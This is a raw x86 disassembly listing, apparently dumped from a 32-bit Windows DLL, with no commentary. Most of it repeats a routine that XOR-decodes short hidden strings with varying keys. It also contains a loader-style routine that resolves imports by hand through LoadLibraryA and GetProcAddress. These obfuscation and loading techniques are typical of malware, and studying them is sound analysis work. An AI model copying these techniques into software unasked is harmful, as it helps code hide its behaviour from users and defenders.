lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x194 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x17
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0x26
inc cl
mov [ ebp + eax - 0x18c ] dl
movzx eax cl
cmp eax 0x2
jb r-xdata
lea eax [ ebp - 0x18c ]
mov [ ebp - 0x18a ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x18c ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x18
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0x7b
inc cl
mov [ ebp + eax - 0x68 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x68 ]
mov [ ebp - 0x63 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x68 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x19
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0xc4
inc cl
mov [ ebp + eax - 0xa8 ] dl
movzx eax cl
cmp eax 0x6
jb r-xdata
lea eax [ ebp - 0xa8 ]
mov [ ebp - 0xa2 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xa8 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x1a
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0x9b
inc cl
mov [ ebp + eax - 0x38 ] dl
movzx eax cl
cmp eax 0x4
jb r-xdata
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x34 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x1b
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x130 ]
mov eax 0x21
call sub_10039350
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x130 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
mov esi [ ebp - 0x174 ]
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x1c
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0xd8 ]
mov eax 0x6e
call sub_10039350
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xd8 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x1d
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0xe0 ]
mov eax 0x20
call sub_10039350
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xe0 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x1e
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x178 ]
mov eax 0x30
call sub_10039350
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x178 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x1f
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x198 ]
mov eax 0x43
call sub_10039350
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x198 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x20
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x1a0 ]
mov eax 0x55
call sub_10039350
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x1a0 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x21
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x90 ]
mov eax 0x78
call sub_10039350
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x90 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x22
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x100 ]
mov eax 0x65
call sub_10039350
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x100 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x23
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x128 ]
mov eax 0x44
call sub_10039350
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x128 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x24
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x1a8 ]
mov eax 0x3d
call sub_10039350
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x1a8 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x25
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x19c ]
mov eax 0x33
call sub_10039350
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x19c ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x26
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x98 ]
mov eax 0x45
call sub_10039350
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x98 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x27
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x118 ]
mov eax 0x56
call sub_10039350
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x118 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x28
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0xe8 ]
mov eax 0x60
call sub_10039350
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xe8 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x29
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0xf8 ]
mov eax 0x3a
call sub_10039350
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xf8 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2a
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0xa0 ]
mov eax 0x70
call sub_10039350
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2b
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x1a4 ]
mov eax 0x51
call sub_10039350
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x1a4 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2c
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x138 ]
mov eax 0x2d
call sub_10039350
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x138 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2d
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x88 ]
mov eax 0x5b
call sub_10039350
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x88 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2e
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x110 ]
mov eax 0x1b
call sub_10039350
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x110 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2f
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x120 ]
mov eax 0x28
call sub_10039350
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x120 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x30
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x108 ]
mov eax 0x61
call sub_10039350
mov eax edi
mov [ ebp - 0x15c ] 0xf
mov [ ebp - 0x160 ] ebx
mov [ ebp - 0x170 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x108 ]
push eax
lea ecx [ ebp - 0x170 ]
call sub_1005d090
lea ecx [ ebp - 0x170 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x31
call sub_10003820
cmp [ ebp - 0x15c ] 0x10
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x170 ]
push edx
call sub_10065045
add esp 0x4
sub_10050930
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_10050980
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_100509c1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
mov eax [ ebp + 0x20 ]
mov ecx [ ebp + 0x18 ]
push 0x3
mov [ eax ] ecx
pop eax
pop ebp
retn 0x1c
sub_10050a00
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
cmp ebx 0x7ffffffe
jbe r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
jae r-xdata
push r--data
call sub_100616c6
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x10 ]
push eax
push ebx
call sub_1000fb70
xor ecx ecx
cmp ecx ebx
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
test ebx ebx
jne r-xdata
cmp ebx 0x8
jae r-xdata
xor ecx ecx
cmp ecx ebx
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
mov [ esi + 0x10 ] ebx
cmp eax 0x8
jb r-xdata
push edi
mov edi [ esi + 0x10 ]
cmp ebx edi
jae r-xdata
xor eax eax
mov [ esi ] ax
mov esi [ esi ]
cmp eax 0x8
jb r-xdata
mov edi ebx
xor edx edx
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0x7
xor ecx ecx
mov [ esi + edi * 2 ] dx
cmp ecx ebx
pop edi
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
mov ebx [ esi ]
test edi edi
je r-xdata
push ebx
call sub_10065045
mov ebx [ ebp + 0x8 ]
add esp 0x4
lea ecx [ edi + edi ]
push ecx
push ebx
push esi
call sub_10078600
add esp 0xc
sub_10050ac0
push ebp
mov ebp esp
push 0xffffffff
push sub_100813fb
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] r--data
mov edx [ edi ]
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov esi [ edx + 0x4 ]
add esi edi
call sub_10024c80
mov eax [ ebp + 0xc ]
mov ecx esi
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] ebx
call sub_10052a60
mov [ esi + 0x40 ] al
cmp [ esi + 0x38 ] ebx
jne r-xdata
mov ecx [ edi + 0x10 ]
mov edx [ ecx + 0x4 ]
mov [ edi + edx + 0x10 ] r--data
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] r--data
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ esi + 0xc ]
or eax 0x4
or eax 0x4
and eax 0x17
mov [ esi + 0xc ] eax
test [ esi + 0x10 ] eax
je r-xdata
push ebx
mov ecx esi
call sub_10007bc0
sub_10050b70
push 0xc
push r--data
call sub_10078b50
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
or eax 0xffffffff
jmp r-xdata
push esi
call sub_10060aae
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_10004fe4
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10050bdc
jmp r-xdata
and [ esi + 0xc ] 0x0
call sub_10078b95
retn
mov eax [ ebp - 0x1c ]
sub_10050bf0
push ebp
mov ebp esp
push ecx
xor eax eax
push ebx
mov ebx [ esi + 0xcc ]
push edi
mov edi [ esi + 0xd0 ]
mov [ esi + 0xd5 ] ax
mov [ esi + 0xd8 ] eax
mov [ esi + 0xdc ] eax
mov [ esi + 0xe0 ] eax
lea eax [ esi + 0x94 ]
push eax
lea ecx [ esi + 0x78 ]
push ecx
lea eax [ esi + 0x5c ]
push eax
movzx eax [ esi + 0x3c ]
lea ecx [ esi + 0x40 ]
push ecx
push eax
lea ecx [ esi + 0x4 ]
push ecx
mov ecx [ ebp + 0x8 ]
lea edx [ esi + 0xb0 ]
call sub_10023540
add esp 0x18
mov [ esi + 0xec ] eax
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x4 ]
call eax
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
push esi
call sub_1006a7e0
test eax eax
je r-xdata
mov eax 0x1
pop edi
pop ebx
pop ecx
pop ebp
retn 0x4
push 0x0
mov eax 0x1f4
mov edi esi
mov [ esi + 0xd5 ] 0x1
call sub_100256b0
push ebx
push 0x1
push esi
mov [ esi + 0xd8 ] eax
call sub_1006a7e0
test eax eax
jne r-xdata
mov ecx [ esi + 0xec ]
mov edx [ ecx ]
mov eax [ edx + 0xc ]
call eax
mov ecx [ esi + 0xec ]
test ecx ecx
je r-xdata
pop edi
mov [ esi + 0xe4 ] ebx
mov [ esi + 0xd4 ] 0x1
xor eax eax
pop ebx
pop ecx
pop ebp
retn 0x4
push 0x1
mov eax 0x7d0
mov [ esi + 0xd6 ] 0x1
mov [ esi + 0xe0 ] 0x1
call sub_100256b0
mov [ esi + 0xdc ] eax
mov [ esi + 0xec ] 0x0
mov eax 0x2
pop edi
pop ebx
pop ecx
pop ebp
retn 0x4
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
sub_10050d0f
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_10050d50
push ebp
mov ebp esp
sub esp 0x8
mov ecx [ eax + 0x8 ]
push esi
mov esi [ ecx + 0x80 ]
mov eax [ esi + ebx + 0xc ]
add esi ebx
mov [ ebp - 0x4 ] esi
test eax eax
je r-xdata
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
push edi
jmp r-xdata
add eax ebx
push eax
call [ LoadLibraryA@IAT ]
mov edi [ esi ]
mov esi [ esi + 0x10 ]
add edi ebx
mov ecx eax
mov eax [ edi ]
add esi ebx
mov [ ebp - 0x8 ] ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x14
mov [ ebp - 0x4 ] eax
mov eax [ eax + 0xc ]
test eax eax
jne r-xdata
jmp r-xdata
mov esi [ ebp - 0x4 ]
pop edi
add eax ebx
jns r-xdata
add eax 0x2
and eax 0xffff
jmp r-xdata
mov ecx [ ebp - 0x8 ]
push eax
push ecx
call [ GetProcAddress@IAT ]
add edi 0x4
mov [ esi ] eax
mov eax [ edi ]
add esi 0x4
test eax eax
jne r-xdata
sub_10050de0
push ebp
mov ebp esp
push 0xffffffff
push sub_10080160
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x18 ] esi
add esi 0x1c
mov [ ebp - 0x14 ] 0x2
cmp esi [ ebp + 0x8 ]
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ebx 0x7fff
call sub_10028da1
mov edi eax
and edi ebx
cmp [ ebp - 0x14 ] ebx
jbe r-xdata
xor edx edx
mov eax edi
div [ ebp - 0x14 ]
